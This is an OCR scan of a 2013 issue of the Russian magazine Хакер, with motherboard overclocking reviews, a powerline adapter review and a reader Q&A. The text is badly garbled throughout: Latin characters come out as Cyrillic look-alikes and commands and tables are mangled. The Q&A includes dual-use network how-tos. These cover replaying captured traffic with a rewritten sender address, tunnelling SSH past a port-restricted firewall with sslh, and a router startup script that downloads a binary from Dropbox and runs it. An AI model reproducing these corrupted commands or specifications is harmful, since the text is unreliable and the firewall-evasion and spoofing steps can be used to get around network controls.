стоятельно, без применения функции автоовер- 
клокинга, нам удалось поднять частоту шины 
до стабильных 259 МГц — результат достаточно 
средний и самый низкий среди участников 
сегодняшнего тестирования. 

На наш взгляд, при всех своих недостатках 
материнская плата ВІОБТАР ТА990РХЕ все равно 
полностью оправдывает свою стоимость. Разгон 
процессора в разумных пределах осуществить 
вполне возможно. И если собирать систему 
с одной видеокартой, то нехватки слотов рас- 
ширения ты не заметишь. 



□ низкая стоимость 

□ оверклокерские 
улучшайзеры 

В мало БАТА-портов 
В недочеты в разводке 
слотов расширения 
В радиатор южного моста 
еле справляется 
с охлаждением 
В самый слабый в тесте 
разгонный потенциал 





йОКЗ, 1066-2200 МГц ООРЗ, 1066-2000 МГц ООРЗ, 800-2133 МГц 

1 х РСІ Ехрге$5 хіб, 1 * РСІ Ехргез$ хі, 2 х РСІ 6 х РСІ Ехрге$5 х16,1 * РСІ 4 х РСІ Ехрге$$ хіб, 2 х РСІ Ехрге$$ хі, 1 х РСІ 

5 х 5АТА 3.0 8 х 5 АТА 3.0 6 х 5АТА 3.0 



ЕіЬегпеІ, 10/100/1000 Мбит/с 

7.1-сЬаппеІ НОА 

2 х Ц5В 3.0, 4 х Ц$В 2.0, 1 х 5/РОІР, 1 х РігеМге, 
1 X еЗАТА II, 1 X Р.І-45, 2 х Р5/2, 6 х аудио 

АТХ 



ЕЧіегпеІ, 10/100/1000 Мбит/с 

7.1-сЬаппеІ НОА 

2 х 115В 3.0, 7 х 115В 2.0, 2 х 5/РОІР, 1 х РігеМге, 
2 х еЗАТА, 1 х Р.І-45, 1 х Р5/2, 6 х аудио 

Е-АТХ 



ЕіЬегпеІ, 10/100/1000 Мбит/с 

7.1-сЬаппеІ НОА 
2 х 115В 3.0, 

4 х 115В 2.0, 2 х 5/РОІР, 1 х РігеѴѴіге, 2 х еЗАТА, 

1 х Р 3-45, 2 х Р5/2, 6 х аудио 

АТХ 



ХАКЕР 01 /168/ 2013 



135 




РЕРКІІМ 



МБІ 990РХА-СР80 




□ разводка 

□ высокий разгонный 
потенциал 

□ оверклокерские 
улучшайзеры 

□ приемлемая стоимость 



В сырой комплектный ВІОБ 
В капризность при разгоне 
В мало 5АТА-портов 



в виде контроллера 115В 3.0 МЕС 0720200. Но не 
больше. Несколько удивляет наличие у топовой 
в линейке материнки всего шести портов 5АТА. 

Атеперь самое интересное: М5І 990РХА- 
6080 по статусу положено быть оверклокер- 
ской. Что касается подсистемы питания, то тут 
все нормально. За стабильную работу процессо- 
ра отвечает сразу десять фаз и известная всем 
технология Мііііагу Сіэбб II. Имеются на плате и 
оверклокерские улучшайзеры: индикатор Р05Т, 
кнопки включения/перезагрузки системы, а 
также клавиша ОС бепіе II. Первоначально 
нас нисколечко не удивил голубой экран ВІ05 
данной платы. Но при нажатии кнопки, активи- 
рующей технологию ОС бепіе II, ничего не про- 
исходило. Мало того, поднятие частоты шины 
провоцировало разгон всего одного (!) ядра. 

Хотя в настройках в меню Оѵегсіоскіпд были 
задействованы все четыре «головы» процессо- 
ра. Максимальный же стабильный показатель 
ВСІ.К составил всего 249 несчастных мегагерц. 

К тому же работать в ВІ05 было абсолютно не- 
возможно из-за кошмарного лага. 

Первая же мысль и первое же решение — 
перепрошить ВІ05. На моменттеста актуальной 
считалась версия микрокода 11.11. После стан- 
дартной операции «кройки и шитья» и пере- 
загрузки нас встретил уже не голубой экран, 
а симпотный билд ІІЕРІ-оболочки. Но самое 
главное — без глюков и тормозов. Первым при- 
знаком ренессанса М5І 990РХА-6080 послужил 
тот факт, что заработала технология ОС бепіе II, 
разгоняющая процессор и память. 

Отметим, что настройками по разгону М5І 
990РХА-6080 не изобилует. Но все основные 
присутствуют. Напряжение на СРІІ подается с 
шагом 0,01 В. При этом никаких цветовых инди- 
каций не предусмотрено. Возможностей ВІ05 
нам хватило, чтобы разогнать М5І 990РХА-6080 
по шине до 300 МГц! А это, между прочим, вто- 
рой результат в тесте. Добавим, что на «хоботе» 
зарегистрирован результат в 320 МГц, постав- 
ленный британским оверклокером Ьогапсіі. 

В итоге получилось так, что банальная пере- 
прошивка ВІ05 превратила М5І 990РХА-6080 
из гадкого утенка в настоящего белоснежного 
лебедя. Больно радикальными оказались изме- 
нения. С учетом всех плюсов, минусов, а также 
стоимости платы нами было принято решение 
наградить М5І 990РХА-6080 призом «Лучшая 
покупка». 



ро мытарства с материнской платой М5І 
990РХА-6080 можно было бы написать 
целый фантастический роман по всем 
правилам жанра: с завязкой, кульминацией 
и развязкой. Уже извлекая сей «агрегат» из 
миниатюрной коробки, мы при попытке хоть 
как-нибудь придраться к разводке компонентов 
вынуждены были обломаться. С учетом такого 
количества слотов расширений распайка 
интерфейсов осуществлена грамотно. Под- 
тверждаем. 



Теперь конкретно. М5І 990РХА-6080 
имеет на своем борту сразу четыре порта РСІ 
Ехргезз х16. Правда, работают они по схеме 
х16 + х8 + х8 + х4. Материнская плата поддер- 
живаеттройные массивы видеокарт АМб и 
ІМѴЮІА. Помимо РЕ6-слотов, М5І 990РХА-6080 
насчитывает парочку РСІ Ехргезз хі и еще один 
РСІ (на всякий случай). В итоге, изучив все 
имеющиеся у платы интерфейсы, мы видим, 
что потенциал набора логики в М5І 990РХА- 
6680 использован полностью. С «щепоткой» 



136 



ХАКЕР 01 /168/2013 






1_а Ригіа Роіа 




у какой же тест плат может обойтись 
без творений компании 6І6АВѴТЕ? 

Да никакой! Есть лишь один момент: 
с материнкой 6І6АВУТЕ ОА-990РХА-1Ю7 
ты уже хорошо знаком. Впрочем, таким платам 
мы всегда рады. 

Начнем с того, что 6І6АВУТЕ 6А-990РХА- 
1Ю7 — единственная в тесте «мама», выпол- 
ненная в форм-факторе Е-АТХ. Следователь- 
но, стоит учитывать этот факт при подборе 
компьютерного корпуса. Столь масштабные 
текстолитовые просторы позволили тайвань- 
ским инженерам распаять на плате сразу 
шесть (!) РЕ6-портов. Работать они будут 
по схеме х 1 6 + хіб + х8 + х8 + х4 + х4. 3-ѴѴау/ 
Оиасі массивы видеокарт — все включено! 
Отметим, что полноценные слоты на шест- 
надцать линий достаточно серьезно удалены 
друг от друга. Следовательно, пара видеокарт 
не будут греть друг друга. Все мостики идут в 
комплекте. 

Еще один интересный момент: слоты йІММ 
нужно считать не слева направо, а, наоборот, 
справа налево. В этом случае модули опера- 
тивной памяти необходимо устанавливать 
в дальние порты. Что очень удобно в случае 
использования пары планок с высокими 
радиаторами. Они не будут конфликтовать 
с габаритными процессорными кулерами. 

Наличие большого числа РЕ6-слотов выну- 
дило инженеров 6ЮАВУТЕ несколько сместить 
северный мост. В 6І6АВУТЕ 6А-990РХА-ОО7 
он стоит в ряд с десятифазной цепью питания 
и охлаждается габаритным радиатором. Опять 
же гипотетическое наличие большого числа 
видеокарт заставило переместить внеш- 
ние клавиши управления системой в район 
24-пинового коннектора питания. Там же на- 
ходится клавиша обнуления настроек ВІОБ'а, 
защищенная пластиковой крышкой на случай, 
если ты — Кержаков. Осталось местечко и для 
слота РСІ. 

В целом разводка компонентов выполнена 
на высочайшем уровне. У нас претензий нет. 
Радует и тот факт, что 6І6АВУТЕ 6А-990РХА- 
1107 снабдили большим числом портов БАТА, 
еБАТА, а также 115В 2.0. 

Поговорим о разгоне. Наша ненаглядная 
0І6АВУТЕ 6А-990РХА-1Ш7 — единственная в 
тесте плата, обделенная графической оболоч- 
кой ІІЕРІ. Новичкам сей факт может показаться 



результат в тесте, весьма и весьма достойный 
результат. 

В самом начале статьи мы уже доказали, 
что на базе процессоров АМР вполне можно 
создать геймерскую систему. И 6І6АВУТЕ 
6А-990РХА-1Ю7 станет отличным подспорьем. 
И не только. На базе АМй и героини этих строк 
вполне возможно собрать рабочую станцию, 
когда обрабатывать данные будет не сам СРІІ, 
а, например, ЫѴЮІА Оиасіго. При этом затраты 
на покупку «камня», платы и памяти будут 
ощутимо ниже, нежели затраты на компоненты 
системы на базе логики Іпіеі. 



ОІОАВѴТЕ 6А-990РХА-1Ш7 



□ ВЫСОКИЙ 

разгонный 

потенциал 

□ разводка 

□ оверклокерские 
улучшайзеры 

□ удобное 
расположение 
слотов 01 ММ 

В нет ІІЕРІ- 
оболочки 



минусом системы. Техноманьяки же со стажем 
лишний раз поностальгируют. Все оверклокер- 
ские функции расположены во вкладке М.І.Т. 
(МоВо Іпіеііідепі Тѵѵеакег). При этом вначале 
идут настройки шин и множителей систе- 
мы, затем опции разгона памяти и, наконец, 
параметры напряжений процессора, мате- 
ринки и ОЗУ. Отмечаем, что никаких функций 
авторазгона (то есть — «нажми одну кнопочку 
и радуйся») не предусмотрено: есть лишь 
режимы АіЛо и МапиаІ. Тем не менее мы без 
проблем разогнали 6І0АВУТЕ 6А-990РХА-1Ю7 
до стабильных 291 МГц по шине! А это третий 



ВЕ5Т0РТНЕВЕ5Т 

Когда в сравнительном тестировании принимают участие исключительно 
топовые «железки», всегда тяжело определиться с победителями в той 
или иной номинации. Особенно в тесте материнских плат. Напомним, что 
«слонов» у нас всего два: «Лучшая покупка» и «Выбор редакции». Первый 
приз получает плата М51 990РХА-6080. Признаемся, с данной материнкой 
мы в итоге провозились больше всего. Уж больно капризно она себя вела во 
время оверклокинга. Но это того стоило! Плата с достаточно демократичной 
стоимостью продемонстрировала второй результат по разгону в тесте. К тому 



же нареканий по разводке компонентов, функционалу и элементной базе 
М5І 990РХА-6080 у нас нет. Разве что кому-то может показаться, что шесть 
портов БАТА 3.0 недостаточно. 

Награду «Выбор редакции» получает А505 СгоззЬаіг V Рогтиіа. Абсо- 
лютный лидер теста! Да нам просто не к чему придраться, больно уж хороша 
получилась материнка. 

Отметим, что остальные платы, представленные в сегодняшнем тесте, 
также достойны внимания. Даже несмотря на то, что они не получили на- 
град. з: 



ХАКЕР 01 /168/2013 



137 









РЕРРУМ 



Николай Арсеньев 



АЗІЯ 



СКОРОСТНАЯ связь 
ЧЕРЕЗ РОЗЕТКУ 





Разъемы: 4 х В.і- 45 (Ю00 Мбит/с) 
Криптозащита: АЕ5 (128 бит] 
Индикаторы: питание, связь 
Скорость: до 500 Мбит/с 
Система питания: 100-240 В /50-60 Гц 
Покрытие: до 150 м 2 
Габариты: 140 х 75 * 42,4 мм 
Комплект поставки: 
Роѵѵегііпе-адаптер (для РІ.-Х52Р — 

2), 2 кабеля Р.І-45, инструкция 
пользователя, гарантийный талон 
Дата начала продаж: конец января 
2013 года 



■ лучшая скорость в классе 

■ четыре гигабитных порта 
В не теряется розетка 



ариантов доступа в интернет в наше время 
очень много. Хочешь — проводной, хочешь — 
беспроводной. Выбор зависит от целей и за- 
дач. Безусловно, ѴѴі-Рі — штука отличная, но порой 
стены мешают, и очень, снижая скорость обмена дан- 
ных до минимума. В таких случаях проводные техноло- 
гии куда как пригоднее, хотя есть немало препятствий 
например необходимость проводки сетевых кабелей. 
Если они не были заложены изначально в планировку 
квартиры, придется затеять капитальный ремонт. 
Бюджет не резиновый, да и нервов своих и соседей 
не напасешься. Лишних затрат и потери времени мож- 
но избежать, если пойти другим путем. Все мы знаем 
о технологии А05Ц например, она до сих пор достаточ- 
но популярна и не требует прокладки кабелей, нужен 
лишь телефонный провод. Роѵѵег Ыпе Соттипісаііоп 
по идеологии схожа с А05І_ с одной лишь разницей: 
для передачи данных используется обычная розетка 
питания. Преимущества подхода очевидны: исполь- 
зуя розетку и І_АМ-кабель, можно обеспечить доступ 
к сети множеству устройств. До поры до времени 



РЬХ51Р/ 

РІ_-Х52Р 



подобные решения были ограничены по возможно- 
стям, скорости и функциональности, но все меняет- 
ся. А51І5 обновила линейку своих устройств серии 
Роѵѵегііпе моделью РІ_-Х51Р, получившей ряд приятных 
усовершенствований по сравнению с предыдущим 
поколением. Впервые для устройств такого типа вы 
встретите сразу четыре гигабитных І_АМ-порта, один 
из которых обладает своей изюминкой. Это ѴІР-порт, 
на него всегда идет приоритет трафика. Очень удобно, 

например, подключить игровую консоль или не менее 
игровой компьютер к нему и получить минимальные 
задержки и максимальную скорость, чтобы обеспечить 
себе идеально «гладкий» игровой процесс. 

Используя новенький Р1.-Х51Р, ты получаешь 
не только обилие 1_АМ-портов, но и сохраняешь полно- 
ценную розетку, которая никогда не помешает. Новин- 
ка обеспечивает рекордную для этого типа устройств 
скорость передачи данных — до 500 Мбит/с— и зону 
покрытия до 150 м 2 . Безусловно, добиться пиковой 
пропускной способности в далеко не идеальных 
условиях наших электрических сетей проблематично, 
но А5У5 интегрировала в устройство фильтр шумов 
для компенсации флуктуаций в линии питания. Также 
стоит отметить, что все данные шифруются 128-битным 
алгоритмом АЕ5. Один из плюсов линейки Роѵѵегііпе- 
устройств — элементарность подключения, не тре- 
буется никаких дополнительных программ, сложных 
настроек и прочих шаманств. Подключение устройств 
происходит автоматически, при необходимости 
индивидуальные настройки можно произвести через 
ноутбук или персональный компьютер. 

А51І5 позаботилась и о системе сбережения 
энергии. Она распознает, когда нагрузка на устрой- 
ство мала или полностью отсутствует; в случае такого 
сценария РІ_-Х51Р перейдет в режим пониженного 
потребления энергии или режим ожидания. Разумеет- 
ся, для работы самого устройства внешнего питания 
не требуется. 

ВЫВОДЫ 

А51І5 Р1.-Х51Р — практичное и простое в использова- 
нии устройство, которое поможет без лишних проблем 
подключить большое количество девайсов к домашней 
сети и интернету. Удобно, тем более что теперь и хо- 
лодильники, и телевизоры, и прочая бытовая утварь 
получила сетевую функциональность. Будем надеять- 
ся, что цена не подкачает. 

Р. 5. Есть одна бородатая фраза из не менее боро- 
датого анекдота: «Дайте две!» В А51І5 его, похоже, 
знают и успели подготовиться заранее: модификация 
Р1.-Х52Р включает в комплект поставки два полноцен- 
ных Роѵѵегііпе-адаптера. ш 



ХАКЕР 01 /168/2013 



139 



РАО 



Роман Гоций ІдоІБІіготапйдтаіІ.сотІ 



РАО 

ЕСТЬ ВОПРОСЫ — ПРИСЫЛАЙ 
НА РАОПЯЕАІ..ХАКЕР.ІНІ 



Когда я только купил свой андроид-де- 
вайс, он «бегал» очень быстро. Сейчас 
же, после года с лишним активного исполь- 
зования, приложения стали запускаться явно 
дольше и вообще время от времени аппарат 
подвисает. Когда телефон начинает глючить, 
я с помощью менеджера процессов убиваю 
те процессы и сервисы, что не используются 
в данный момент. Это помогает, но ненадол- 
го. Можно ли как-то иначе решить эту 
проблему? 

По существу, убивание процессов 
выгружает их из кеша, тем самым очищая 
оперативную память. Большинство людей 
считает, что чем больше свободной памяти, тем 
быстрее работает телефон или планшет. Но это 
не совсем так. Сохранение в кеше часто 
используемых приложений позволяет системе 
загружать их быстрее, тем самым ускоряя твое 
устройство. Поэтому слепым убиванием 
не используемых в данный момент приложений 
чаще всего можно нанести больше вреда, чем 
пользы. Сам по себе Апсігоігі достаточно хорошо 
справляется с управлением памятью, выгружая 
для тебя неиспользуемые приложения. 

Но не все приложения равноценны, и не каж- 



дый разработчик пишет идеальный код; утечки 
памяти тоже никто не отменял. Как результат, 
рано или поздно большое количество 
приложений в кеше начинает мешать нормаль- 
ной работе системы. Выход есть — использо- 
вать более умный менеджер процессов, как, 
например, Аиіо Метогу Мападег І ооо.о1/8хѵг6 1. 
Что делает его умным? Как минимум то, что все 
установленные приложения этот менеджер 
процессов разбивает на несколько категорий. 
Для каждой категории можно указать уровень 
свободной оперативки, при котором менеджер 
начнет выгружать приложения из этой 
категории. Таким образом, некритические или 
редко используемые приложения будут 
выгружаться первыми. Приложение позволяет 
установить автоматическую очистку, а также ее 
период. 

□ Всегда пользуюсь в своих проектах 
самоподписанными 551-сертифика- 
тами, но у многих пользователей возникают 
проблемы с импортированием их в браузер. 
Покупать же сертификат не хочется, так 
как цены на них кусаются. Можно ли получить 
сертификат бесплатно? 



Бесплатно сертификат можно получить 
на сайте зіагіззі.сот . Чтобы им обзаве- 
стись, достаточно только проверки твоего 
е-таіі-адреса и факта владения доменом. 
Сертификат совершенно бесплатный, заплатить 
около шестидесяти долларов придется только 
за верификацию твоей личности, если тебе 
нужен ѵѵіісісагсі-сертификат. Замечу, что серти- 
фикаты 5іагі55І_ поддерживаются множеством 
ПО: Апсігоісі, Сатіпо, Рігеіох, РІоск, СЬготе, 
Копциегог, ІЕ, МогіІІа БоКѵѵаге, Ыеізсаре, Орега, 
5а!агі, БеаМопкеу, іРЬопе, ѴѴіпгіоѵѵз. Не может 
не радовать русская версия интерфейса сайта :). 

□ Мне нужно симулировать, то есть 
переотправить перехваченный 
сниффером трафик. Как легче всего можно 
это сделать? 

□ Отличным решением задачи является 
использование утилит из пакета 
Тсргеріау ( ісргеріаѵ.зупііп.пеі ). Для перехвата 
и сохранения трафика в файл в формате рсар 
можно использовать утилиту Ісрсіитр: 

# Ісрсіитр -пі мІапѲ -50 -м сіитр.рсар «-• 
рогі 501 






КАК ЗАСТАВИТЬ ІРТѴ ЛЕТАТЬ ПО ѴУІ-РІ С ПОМОЩЬЮ ІЮРХѴ НА ПРОШИВКЕ йО-УУРТ 



Так сложилось, что ІРТѴ вещается провайде- 
рами в форме ІЮР Миііісазі. Поэтому беспро- 
водные сети просто ложатся и умирают, если 
такое в них попадает. Но если очень хочется, 
чтобы дома интернет-телевидение от про- 
вайдера попадало на ноут по ѴѴі-Рі, то надо 
преобразовать ІЮР Миііісазі поток в НТТР- 
поток, и все заработает идеально. Для этого 
нам понадобится альтернативная прошивка 
роутеров йО-МРТ и малюсенький демон 
исірху І 5оигсеіогде.пеІ/ргоіесІ5/и(ірхѵ ). Метод 
должен работать на большинстве девайсов, 
но тестировался только на й-Ыпк йІР-82, 
йІР-300, 01Р-400; А51І5 ѴѴЬбООдР Ѵ2; ТР-ШК 
ТЫ/ѴР1043Щ Т1_-ѴѴР741ІМО. 



Во-первых, нам нужно установить йО- 
ѴѴРТ на роутер. Для начала следует 
проверить, поддерживается ли 00- 
ѴѴРТ твоей железкой. Сделать это можно здесь: 
ѵѵѵѵѵѵ.сісІ-ѵѵгІ.сот/зіІе/зиррогі/гоиІег-сіа^аЬазе . 
Процесс установки йР-ѴѴРТ сильно отличается 
для разных девайсов, поэтому я отправлю тебя 
на официальную инструкцию по установке: 
ѵѵѵѵѵѵ.сІсі-ѵѵгі.сотМікі/іпсІех.рЬр/ІпзІаІІаІіоп . За- 
мечу только, что роутер очень легко превраща- 
ется в кирпич, который потом довольно сложно 
оживить. Поэтому будь предельно осторожен 
при установке. 



Следующим пунктом будет обход 
файрвола. Самим простым и бы- 
стрым решением является баналь- 
ное отключение файера, это можно сделать 
на вкладке «Зесигііу» (5РІ РігеѵѵаІІ). Этот 
способ приемлем лишь для отладочных целей, 
например при возникновении проблем во 
время настройки ІРТѴ. Постоянно же держать 
выключенным файрвол, как ты понимаешь, 
не следует. Правильный способ заключается 
в настройке ірІаЫег роутера таким обра- 
зом, чтобы он не резал наш ІРТѴ. Для этого 
в Агітіпізігаііоп -> Соттапсіз добавь строчку: 

ірТаЫез -I ІІ^РІІТ -сі 
224.0.0.0/240.0.0.0 АССЕРТ 





140 



ХАКЕР 01 /168/2013 





Вопросы и ответы 



Также в пакете присутствует очень полезная 
утилита Ісргеѵѵгііе, позволяющая производить 
всяческие замены в перехваченном трафике. На- 
пример, замену адреса отправителя 95.133.87.181 
на адрес локальной машины 192.168.1.1 можно 
сделать при помощи такой команды: 

# -Ьсргемгі-Ііе --зкірЬгоасІсаБ-І: ^ 

- - рпа1:=95 . 133 . 87 . 181 : 192 . 168 . 1 . 1 ^ 

- - іп 61 е=с!итр . рсар - -оиТ 61 е=сІитр 2 . рсар 

Для того чтобы повторно сгенерировать 
пакеты, нужно вызвать 



# *сргер1ау --іп*Ті=е1:Ь0 сІитр2.рсар 



Для редактирования рсар-дампа можно 
также использовать мощный инструмент 
пеісіисіе ( пеІсІисІе.зоигсеіогде.пеЕ ). 



□ Как поднять 55Н-соединение, если 
межсетевой экран ограничивает меня 
только портами 80 и 443? 

□ Есть отличное решение этой проблемы. 

В рамках проекта збіЬ ( ѵтѵѵ.гиІзсЫе.пеІ/ 
ІесН/55ІЬ.5ЫтІ ) развивается мультиплексор 
551_/55Н-соединений, способный принимать 
соединения на одном порту и перебрасывать 
их в зависимости от типа протокола. Поддер- 
живаются такие протоколы, как НТТР, НТТР5, 
85Н, ОрепѴРМ, ІіпсиХМРР. 

Для решения проблемы нужно запустить 
ззІЬ за пределами межсетевого экрана 
на 443-м порту. Для этого выполни такую 
команду: 



# ббііі --изег 55ІЬ --ІізТеп 0.0.0.0:443 — 
--55І1 127.0.0.1:22 --55І 127.0.0.1:443 



• --изег ззІЬ определяет пользователя, под 
которым следует запустить ббіЬ; 

• — ІІБІеп 0.0.0.0:443 — ІР и порт для приема 
внешних соединений; 



ШИФРОВАНИЕ ДАННЫХ В ОБЛАЧНЫХ СЕРВИСАХ 



□ МНЕ НУЖНО ШИФРОВАТЬ ФАЙЛЫ, КОТОРЫЕ Я ХРАНЮ В ОБЛАЧНОМ 

ХРАНИЛИЩЕ. СУЩЕСТВУЕТ ЛИ БОЛЕЕ УДОБНЫЙ МЕТОД, ЧЕМ ОБЫЧНОЕ 
ШИФРОВАНИЕ КОНФИДЕНЦИАЛЬНЫХ ФАЙЛОВ ПЕРЕД ЗАГРУЗКОЙ ИХ В 
ОБЛАКО С ПОМОЩЬЮ ЛЮБОЙ УТИЛИТЫ, КОТОРАЯ УМЕЕТ ЭТО ДЕЛАТЬ? 

Существует, и не один! Например, можно использовать ТгиеСгурІ. Просто 
создай шифрованный файловый контейнер и сохрани его в ОгорЬох или 
любое другое облачное хранилище, которое поддерживает синхрониза- 
цию только изменившихся частей файла. Это сэкономиттебе трафик и время, если 
ТгиеСгурІ-контейнер вырастет в размерах. Еще одним решением является ис- 
пользование программы ВохСгурІог (ѵѵ ѵт.ЬохсгѵрІог.сот ). ВохСгурІог выгружает 
в облако зашифрованные версии файлов, которые ты поместишь в специальный 
ВохСгурІог-раздел. Существуют версии программы для Апсігоігі (поддерживает 
ОгорЬох и Соодіе Огіѵе) и ЮБ (в настоящее время только ОгорЬох), что очень удобно. 
Если у тебя Ыпих, можешь поднять ЕпсРБ ( \л/\А/уу.агд0 .пе 1/епсЫ . По принципу работы 
ЕпсРБ очень похож на ВохСгурІог, но ты работаешь не с разделом, а со специальной 
папкой. Кроме того, в отличие от бесплатной версии ВохСгурІог, ЕпсРБ не имеет 
ограничения на количество сохраняемых файлов. Помимо всех предложенных 
вариантов, можно сменить облачное хранилище на такое, которое поддерживает 
шифрование на стороне клиента. Хорошими примерами таких сервисов являются 
БрісІегОак и ѴѴиаІа. Эти сервисы шифруют и расшифровывают твои данные локаль- 
но, соответственно, они представления не имеют, что за данные ты сохраняешь. 



*.*иаі*.сот 






ЬуІЛСС 



Ноте Г««(иге» іесииГу Рпстд ВІод Оониіім 



Геаиігез 



*ЬаІ і\ Жиаіа 



Ьк кир Л Ѵсгмоптд 



Зесипгу & Рпѵасу 

Шіміа ркяиіі уоиг даіа апд дмгік уоиг рпѵасу. 

*м1а п ГѴ р*асг *оі иопяд да(а «ѵл*і с^ситѵ т ттд Іп огд«ч ю ргоім» уоиг 
рсмасу *маи спсіурн Й»е да(а оп уои» ■ отриіеі Ьг'сне л л иріоадсд Оиппд 
иркоад уои» дат* о %рМ ир іс«о тапу ддЬггет р*рсм апд иоісд т тиПірІе 
ріат іо такс сспаіг (Паі уои пеѵес Іом» а ыпфіе ІЛе *оі аддсд мкипіу уош 
расмюсд а ге.-г імпмпіМпд. теат (Ьаі по опс - поі сѵ«п (Ьс 
етріоуеѵ» « Жиаіа - сап уои» рпѵа«с Мс» 




Онлайновый сервис \ѴиаІа 









Нам нужна компиляция исірху под 
процессор конкретного девайса. 
Идем сюда: сіоѵѵпіоасіз.ооепѵѵгі.огд/ 


□ 


Если в твоем устройстве таки нет под- 
держки ЗРРБ, то, как вариант, можно 
при каждом включении роутера скачи- 





Далее выбирай чипсет, на котором работает 
твой роутер (например, для О-Ыпк ОІР-825 — 
аІЬегоз), и переходи в папку «раскадез» — там 
ищи пакет, который начинается с исірху. Этот 
пакет нужно скачать, распаковать и достать 
файл игірху, все же остальное можно удалить. 

В принципе, на данном этапе можно подклю- 
читься к роутеру по Теіпеі и залить файл ирсіху, 
который весит считаные килобайты, в папку 
/]Нз, но не все устройства имеют поддержку 
ЗРРБ. 



вать исірху в папку Атр и запускать. Для этого 
в автозагрузку (Асітіпізігаііоп -» СоттапЬ -» 
Баѵе БіагШр) добавь следующие команды: 

иёе* ЬПр : //61 . ЬгорЬох . сот/и/69514737/.-, 
исірху 

сЬтос! +х исірху 

/*тр/исІрху -а $(пѵгат §е1: 1ап_ірасІсІг) ^ 
-р 4022 -т $(пѵгат §еТ мап_ірас!сІг) «-. 

-В ІМЬ -М 30 

Здесь с ОгорЬох’а загружается компиляция 
ирсіху под АОіегоз. Ты же используй компиля- 
цию под свой чипсет. 



Перезагрузим роутер: Асітіпізігаііоп — ► 
ВеЬооІ гоиіег и проверим статус исірху: 
Ь«р://192.168.1.1:4022/зІаШз. Если 
ты все сделал правильно, то по этому адресу 
увидишь табличку, в полях «Ассерііпд сііепіз 
оп» и «Миііісазі асісігезз» которой должны быть 
корректные ІР'шники. Если здесь все хорошо, 
то пробуем смотреть трансляцию. Для этого 
используем обычный и привычный ѴІ_С-плеер, 
только в файле плей-листа меняем настройки 
каналов с вида исір://(д230.33.0.4:1234 на 

М:*р : //192 . 168 .1.1: 4022/исІр/ ^ 
230.33.0.4:1234 



ХАКЕР 01 /168/2013 



141 






РАО 



--25И 127.0.0.1:22 — ІР и порт для проброса 
55Н; 

— 551 127.0.0.1:443 — ІР и порт для проброса 
НТТР5. 



□ На рабочем столе привык держать 
порядок: все ярлыки, папки, файлы 
не размещены рандомно, а сгруппированы 
по категориям. Но временами приходится 
подключаться к плазме или проектору, из-за 
чего меняется разрешение экрана и весь 
порядок превращается в свалку, что очень 
неприятно. Как настроить восстановление 
размещения ярлыков? 

□ Могу порекомендовать тебе программку 
йезкіор Резіоге ( доо.оІ/Хѵ2ІР ). При ее 
использовании в контекстное меню рабочего 
стола интегрируются три пункта меню: Баѵе 
Оезкіор (сохраняет расположение ярлыков 
для текущего разрешения], Резіоге Оезкіор 
(как и следовало ожидать — восстанавливает) 
и Сизіот Баѵе/Резіоге (предоставляет возмож- 
ность создавать/восстанавливать другие 
конфигурации, а также сохранять конфигура- 
ции в файл). Теперь можешь спокойно менять 
разрешение экрана. Только перед этим щелкни 
Баѵе Эезкіор, и после восстановления 
разрешения к исходному достаточно выпол- 
нить Резіоге Оезкіор, чтобы все ярлыки 
вернулись на свои места. 

□ Имеется файловое хранилище размером 
больше 5 Тб, которое представляет 
собой доменную область обмена на сервере 
\Ѵіп2008 Р2. Передо мной стоят две задачи. 
Во-первых, нужно собрать статистику: какие 
файлы (и сколько их) были изменены более п 
лет назад (желательно с экспортом этой 
статистики в какой-нибудь внешний формат). 
Во-вторых, переместить все файлы, которые 
созданы раньше, чем п лет назад, в резервное 
хранилище. Как бы ты это сделал? 

□ Конечно, можно поискать специализиро- 
ванное ПО, но настройки любой програм- 
мы не могут сравниться в гибкости со скрип- 
том. В этом случае проще всего использовать 
РоѵѵегБЬеІІ, который по умолчанию входит 
в ѴѴіп7 и ѴѴіп2к8 Р2. 



# Сбор статистики 

$с1а1е = СеТ-ОаІе 1.1. 2010 # Для примера 
$61ез = СеІ-СИіІсІІТет -РаІН "Е:\ н 
-Рогсе -Кесигзе | ІлІИеге «-* 
{!$_.РзІзСоп1аіпег -апсі «-• 

$_. ІазІкІгіІеТіте -1е $сІаТе} 

# Выведем количество устаревших файлов 

Игііе-Нозі "ОІсІ біез : " $61ез.1еп§1Ь 

# Экспорт статистики в СБѴ-файл 

$б1е5 | Беіесі Ыате,ОігесТогуМате, «-* 
І_азТкІгіТеТіте, І-азТАссеззТіте | ^ 
Ехрогі-Сзѵ -МоТуре гезиіі.сзѵ — 
-ЕпсосІіп§ ІІпісосіе 

# Перемещение файлов 

$61ез | Моѵе-ІІет -ОезТіпаІіоп "2:\" 



ш 

Рогедгоипсі АррІІсаІІоп 

И 

Ѵі5іЫе АррІІсаІІоп 

И - 

Бесопсіагу Бегѵег 
Нісісіеп АррІІсаІІоп 



• V,. ,ІІ <■ 20:28 

4 МВ 



8 МВ 



16 МВ 



40 МВ 




48 МВ 



> 60 МВ 



Ш 



V,, .,іі в 20:28 



Неір 

Беіесі а ЬиПоп Іог Оіе тетогу ргоТИе іЬа! 
уои ѵѵоиИ Ике іо изе. Ап аэдгеззіѵе ргоЛІе 
жііі ИтІІ Ьоѵѵ тисЬ тетогу Апсігоісі сап 
аиіотаіісаііу изе апсі ѵісе ѵегза. АГСег іИаІ 
ргезз 1Ье Арріу ЬиПоп Іо изе іЬе зеШпдз. 

То зеі апсі изе а сизіот зеІІІп§, зеі іЬе 
Ітетогу ИігезЬоИз изіпд іЬе зіісіегз апсі іЬе 
|рге55 іМе Арріу Ьиііоп. 

ТЫз ѵѵіІІ поі зіор уои Ігот изіп^ уоиг арр5 
1Ье ѵѵау уои ѵѵоиИ Ике апсі 1Ье сЬапде$ аге 
N01 регтапепі. 5о уои сіопі Ьаѵе іо ѵѵоггу 
аЬоиі Ьгеакіп^ уоиг рЬопе. Уои сап 
аіѵѵауз §о Ьаск іо іЛе сіеіаиіі зеШп^з. 

ЕасЛ Ьаг с1еЛпе5 іЛе тетогу іЬгезЛоІс! Гог 
іЬаі іуре оі арр. 

Рог тоге сіеіаііз ѵізіі 

ѵѵеЬ5ІІе. 



Настройка Аиіо Метогу Мападег 



Здесь предполагается, что твое основное хра- 
нилище — это диск Е, а резервное — диск 2. 

Этот скрипт будет перемещать все файлы 
в одну директорию. Если же хочешь, чтобы 
при перемещении сохранялась текущая струк- 
тура папок, то последнюю строчку скрипта 
замени на следующую: 



Можно ли как-то автоматизировать этот 
процесс, а то надоело уже постоянно следить 
